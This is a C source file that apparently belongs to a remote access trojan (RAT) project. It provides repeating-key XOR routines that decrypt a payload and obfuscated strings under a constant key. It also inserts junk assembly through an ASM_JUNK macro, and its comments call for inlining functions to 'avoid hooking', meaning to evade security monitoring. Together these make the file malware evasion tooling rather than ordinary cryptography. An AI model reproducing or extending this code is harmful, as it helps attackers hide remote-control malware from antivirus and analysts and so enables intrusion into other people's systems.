#include <stdlib.h>

#include "global_config.h"
#include <string.h>
#include <stdio.h>
#include "junk_asm.h"

#include "debug.h"


#pragma warning(disable:4996)

/*
1. XOR encryption
*/
/*
char * xor_encrypt_decrypt(char inpString[], char key)
{
	char * res = (char *)calloc(RAT_PAYLOAD_LEN);

	// perform XOR operation of key 
	// with every character in string 
	for (int i = 0; i < RAT_PAYLOAD_LEN; i++)
	{
		res[i] = inpString[i] ^ key;
	}

	return res;
}
*/

// TODO: sometimes, this function does NOT work well and will produce "\x00\x00" on all bytes of output. Take care.
// TODO: make this function inline, avoid hooking
char* xor_encrypt_decrypt(char * input, char* key, int input_len)
{
	ASM_JUNK

    int keyLen = strlen((char*)key);

	char* res = (char*)calloc(input_len, 1);

    for (int i = 0; i < input_len; ++i)
    {
		res[i] = (char)(input[i] ^ key[i % keyLen]);
    }

	return res;
}


// free() the (*decrypt_name) yourself
// TODO: make this function inline, avoid hooking
void decrypt_to_string(char ** decrypt_name, char* STRING, int STRING_LEN) 
{
	*decrypt_name = (char*)calloc(STRING_LEN + 1, 1);
	
	char* decrypted_content = (char*)xor_encrypt_decrypt(STRING, CONSTANT_ENCRYPTION_KEY, STRING_LEN);

	strncpy(*decrypt_name, decrypted_content, STRING_LEN);

	free(decrypted_content);

	//DBG_MSG("decrypt_to_string() - *decrypt_name: %s\n", *decrypt_name);
}